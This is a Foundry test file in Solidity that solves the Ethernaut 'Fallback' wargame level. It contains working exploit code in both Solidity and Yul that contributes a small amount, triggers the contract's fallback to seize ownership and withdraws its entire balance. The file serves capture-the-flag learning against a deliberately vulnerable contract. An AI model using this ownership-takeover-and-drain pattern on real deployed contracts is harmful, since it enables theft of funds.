

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Fallback} from "ethernaut/Fallback.sol";
import {BaseTest} from "../BaseTest.t.sol";

contract FallbackTest is BaseTest {
    Fallback public fallbackInstance = Fallback(payable(0x19F9FC2C0753646e3058978D0D20E5F63D72945A));
    bytes32 CONTRIBUTE_FUNCTION_SIG = keccak256("withdraw()");
    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        fallbackInstance.contribute{value: 0.00001 ether}();
        (bool success,) = address(fallbackInstance).call{value: 1 ether}("");
        require(success, "!FALLBACK");
        fallbackInstance.withdraw();
    }

    function testExploitSol() public override {
        exploitSol();
        // you claim ownership of the contract
        assertEq(fallbackInstance.owner(), address(this));
        // you reduce its balance to 0
        assertEq(address(fallbackInstance).balance, 0);
        // BOOM!
    }

    function exploitYul() internal override {
        address _to = address(fallbackInstance); // TODO: read it using sload and then use
        assembly {
                        // Function Sig for contribute()
            mstore(0x00, 0xd7bb99ba00000000000000000000000000000000000000000000000000000000)
            let success := call(gas(), _to, 1000000000000, 0x00, 0x04, 0x00, 0x00)
            if iszero(success) {
                revert(0, 0)
            }
            success := call(gas(), _to, 1000000000000000000, 0x00, 0x00, 0x00, 0x00)
            if iszero(success) {
                revert(0, 0)
            }
                        // Function Sig for withdraw()
            mstore(0x00, 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)
            success := call(gas(), _to, 0, 0x00, 0x04, 0x00, 0x00)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function testExploitYul() public override {
        exploitYul();
        // you claim ownership of the contract
        assertEq(fallbackInstance.owner(), address(this));
        // you reduce its balance to 0
        assertEq(address(fallbackInstance).balance, 0);
        // BOOM!
    }

    receive() external payable {
        // To receive Eth
    }
}
